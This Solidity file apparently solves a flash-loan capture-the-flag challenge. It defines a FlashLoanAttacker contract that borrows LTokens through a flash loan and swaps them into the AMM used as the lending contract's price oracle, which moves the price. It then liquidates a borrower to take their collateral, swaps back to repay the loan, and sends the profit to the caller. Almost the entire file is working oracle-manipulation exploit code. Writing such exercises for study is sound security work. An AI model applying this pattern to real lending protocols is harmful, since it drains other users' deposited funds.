// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../FlashLoanCTF/Flashloan.sol";
import "../FlashLoanCTF/Lending.sol";
import "../FlashLoanCTF/CollateralToken.sol";

contract FlashLoanAttacker is IERC3156FlashBorrower {
    FlashLender public flashLender;
    Lending public lending;
    AMM public amm;
    IERC20 collateral;
    address borrower;

    uint256 public constant ltLoanAmount = 400e18;

    constructor(FlashLender flashLender_, Lending lending_, address borrower_) {
        flashLender = flashLender_;
        lending = lending_;
        amm = lending.oracle();
        collateral = amm.lendToken();
        borrower = borrower_;
    }

    function attack() external payable {
        // Take some LTokens as loan so we can affect market price
        collateral.approve(address(flashLender), ltLoanAmount);
        flashLender.flashLoan(IERC3156FlashBorrower(this), address(collateral), ltLoanAmount, "");

        // Give LTokens to sender to complete objective
        collateral.transfer(msg.sender, collateral.balanceOf(address(this)));
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // Execute LTokens -> Eth swap here to affect market price
        collateral.transfer(address(amm), ltLoanAmount);
        uint ethAmountOut = amm.swapLendTokenForEth(address(this));

        // Now when market price is changed we can call liquidate method and take its LTokens.
        // (no idea what the original purpose of it)
        lending.liquidate(borrower);

        // We need to pay the dept for flashLender. Lets take back our LTokens from amm. Execute Eth -> LTokens swap.
        (bool success, ) = payable(amm).call{value: ethAmountOut}("");
        require(success);
        amm.swapEthForLendToken(address(this));

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {

    }
}
